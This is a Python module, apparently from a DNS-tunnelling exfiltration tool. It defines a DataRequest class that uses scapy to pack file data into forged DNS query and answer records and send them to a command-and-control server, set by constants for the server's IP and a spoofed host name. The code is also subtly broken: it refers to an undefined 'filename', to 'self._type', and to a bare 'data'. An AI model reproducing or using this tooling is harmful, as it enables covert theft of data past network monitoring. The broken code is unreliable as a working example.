# external imports
from scapy.all import Ether, IP, UDP, DNS, DNSQR, DNSRR, sendp

# internal imports
from utils.consts import INTERFACE, CC_SERVER_IP, CC_SERVER_SPOOFED_HOST, PACKET_OPTIONS
from utils.request_type import RequestType

class DataRequest:
    """ A data request sends actual file data via the subdomains in an A record. """

    def __init__(self, _type, packet_number, file, data):
        self.type = _type
        self.packet_number = packet_number
        self.filename = filename
        self.data = data
    
    def build(self):
        ether = Ether()
        ip = IP(dst=CC_SERVER_IP)
        udp = UDP(sport=PACKET_OPTIONS['UDP']['SPORT'], dport=PACKET_OPTIONS['UDP']['DPORT'])
        dns = DNS(
            qr=PACKET_OPTIONS['DNS']['QR'], # it is a query, not a response
            opcode=self._type,
            qdcount=PACKET_OPTIONS['DNS']['QDCOUNT'],
            ancount=PACKET_OPTIONS['DNS']['ANCOUNT'],
            qd=DNSQR(qname=CC_SERVER_SPOOFED_HOST, qtype=RequestType.DATA.value, qclass=self.packet_number),
            an=DNSRR(rrname=CC_SERVER_SPOOFED_HOST, type=PACKET_OPTIONS['DNS']['AN']['TYPE'], rdata=data)
        )

        return ether/ip/udp/dns
    
    def send(self):
        sendp(x=self.build(), iface=INTERFACE, verbose=0)